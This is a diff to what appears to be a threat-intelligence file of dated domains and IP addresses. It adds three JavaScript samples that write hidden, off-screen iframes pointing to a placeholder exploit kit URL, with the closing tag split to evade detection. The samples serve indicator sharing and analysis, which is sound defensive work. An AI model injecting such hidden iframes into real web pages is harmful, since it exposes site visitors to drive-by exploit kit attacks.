@@ -56,3 +56,17 @@
 |160629|dance.jmestudiocontable.com.ar|139.59.191.79|
 |160626|onno.motorgear.com.au|188.166.38.125|
 |160626|dron.transportemorelli.com.ar|146.185.173.25|
+
+----
+Script example :
+
+```javascript
+document.write('<div class="" style="position:absolute; width:399px; height:400px; left:15px; top:-740px;">  <a> </a><div> <a class="menu_link_new"></a> strong<iframe src="[EK HERE]" width=255 height=261 ></ifram'+ 'e><a></a></div><a class=""></a></div>');
+```
+```javascript
+document.write('<div style="position:absolute; width:365px; height:400px; left:10px; top:-475px;">  <a class=""></a><div class="menu-add-name"> <a class="menuaddname"></a> <iframe src="[EK HERE]" width=271 height=278 ></ifram'+'e><a class=""></a></div> </div>');
+```
+```javascript
+document.write('<div style="position:absolute; width:355px; height:363px; left:10px; top:-954px;">  <a class=""></a><div class="menu-add-name"> <a class="menuaddname"></a> <iframe src="[EK HERE]" width=285 height=290 ></ifram'+'e><a class=""></a></div> </div>');
+```
+
